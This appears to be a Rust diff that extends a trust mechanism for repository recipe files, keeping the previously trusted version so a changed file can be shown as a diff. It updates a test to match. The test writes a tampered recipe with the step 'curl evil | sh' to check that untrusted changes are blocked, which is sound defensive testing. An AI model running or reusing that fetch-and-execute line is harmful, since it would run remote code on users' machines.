@@ -29,6 +29,8 @@ pub struct PendingTrust {
     pub hash: String,
     /// True if an earlier version was trusted and the file has changed since.
     pub changed: bool,
+    /// The version the user trusted before, to show what changed (if it was kept).
+    pub previous: Option<String>,
 }
 
 #[derive(Debug, Default)]
@@ -82,11 +84,13 @@ pub fn load_with(
                     loaded.protected = Some(p);
                 }
             } else {
+                let previous = trusted.as_deref().and_then(|h| store?.trusted_content(h));
                 loaded.pending_trust = Some(PendingTrust {
                     file: path.display().to_string(),
                     content: text,
                     hash,
                     changed: trusted.is_some(),
+                    previous,
                 });
             }
         }
@@ -195,7 +199,7 @@ mod tests {
         assert!(!l.recipes.iter().any(|r| r.name == "Team thing"));
         assert_eq!(l.protected, None);
 
-        store.trust(&repo, &pending.hash).unwrap();
+        store.trust(&repo, &pending.content).unwrap();
         let l = load_with(Some(&repo), None, Some(&store), None);
         assert!(l.pending_trust.is_none());
         assert!(l.recipes.iter().any(|r| r.name == "Team thing" && r.source == Source::Repo));
@@ -203,7 +207,9 @@ mod tests {
 
         std::fs::write(&file, "- { name: Team thing, steps: [curl evil | sh] }\n").unwrap();
         let l = load_with(Some(&repo), None, Some(&store), None);
-        assert!(l.pending_trust.unwrap().changed);
+        let changed = l.pending_trust.unwrap();
+        assert!(changed.changed);
+        assert_eq!(changed.previous.as_deref(), Some(pending.content.as_str()), "the old version, for the diff");
         assert!(!l.recipes.iter().any(|r| r.name == "Team thing"));
         let _ = std::fs::remove_dir_all(base);
     }
